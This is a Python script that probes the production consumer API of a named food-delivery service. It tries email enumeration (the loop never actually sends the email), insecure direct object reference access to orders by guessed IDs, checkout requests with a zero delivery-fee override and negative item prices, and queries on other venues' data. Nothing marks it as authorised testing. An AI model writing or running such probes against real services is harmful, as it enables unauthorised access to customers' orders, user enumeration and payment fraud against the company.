import requests, json

h = {'User-Agent': 'Mozilla/5.0', 'Origin': 'https://wolt.com', 'Content-Type': 'application/json'}

# 1. Email enumeration via signup/verification
print("=== EMAIL ENUMERATION ===")
emails = ['admin@wolt.com', 'test@wolt.com', 'nonexistent123456@wolt.com']
for email in emails:
    try:
        r = requests.post('https://consumer-api.wolt.com/v1/users/start_email_verification', 
                         headers=h, timeout=10)
        print(f'  start_email_verification ({email}): {r.status_code} | {r.text[:100]}')
    except Exception as e:
        print(f'  ERR: {e}')

# 2. Order IDOR attempt - try accessing orders by ID
print("\n=== ORDER IDOR ===")
order_ids = ['1', '100', '1000', 'test', 'order_123']
for oid in order_ids:
    try:
        r = requests.get(f'https://consumer-api.wolt.com/order-xp/web/v1/orders/{oid}', 
                        headers=h, timeout=10)
        if r.status_code != 404:
            print(f'  GET orders/{oid}: {r.status_code} | {r.text[:120]}')
    except Exception as e:
        pass

# 3. Check if we can manipulate delivery_fee in checkout
print("\n=== DELIVERY FEE MANIPULATION ===")
payload = {
    "purchase_plan": {
        "venue": {"id": "60ebeb71c6904c2caf035f71", "country": "FIN", "currency": "EUR"},
        "delivery_method": "homedelivery",
        "menu_items": [
            {"id": "60ebeb71c6904c2caf035f71", "name": "Test", "count": 1,
             "base_price": 100, "price": 100, "end_amount": 100,
             "options": [], "category_id": "test", "exclude_from_discounts": False,
             "restrictions": []}
        ],
        # Try setting delivery fee directly
        "delivery_fee_override": 0
    }
}
r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                 json=payload, headers=h, timeout=15)
d = r.json()
payable = d.get('payable_amount', 'N/A')
print(f'  delivery_fee_override=0: {r.status_code} | payable_amount={payable}')

# 4. Try negative price
print("\n=== NEGATIVE PRICE ===")
payload2 = {
    "purchase_plan": {
        "venue": {"id": "60ebeb71c6904c2caf035f71", "country": "FIN", "currency": "EUR"},
        "delivery_method": "homedelivery",
        "menu_items": [
            {"id": "60ebeb71c6904c2caf035f71", "name": "Test", "count": 1,
             "base_price": -1000, "price": -1000, "end_amount": -1000,
             "options": [], "category_id": "test", "exclude_from_discounts": False,
             "restrictions": []}
        ]
    }
}
r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                 json=payload2, headers=h, timeout=15)
print(f'  negative price: {r.status_code} | {r.text[:200]}')

# 5. Try accessing another venue's orders 
print("\n=== CROSS-VENUE ACCESS ===")
venues = ['wolt-market-kamppi', 'wolt-market-helsinki', 'test-venue-123']
for v in venues:
    try:
        r = requests.get(f'https://consumer-api.wolt.com/order-xp/web/v1/venue/slug/{v}/dynamic/',
                        params={'selected_delivery_method':'homedelivery'}, 
                        headers=h, timeout=10)
        if r.status_code == 200:
            vd = r.json()
            name = vd.get('venue', {}).get('name', '?')
            print(f'  {v}: 200 | venue name: {name} | alive: {vd.get("venue_raw",{}).get("alive","?")}')
    except Exception as e:
        pass
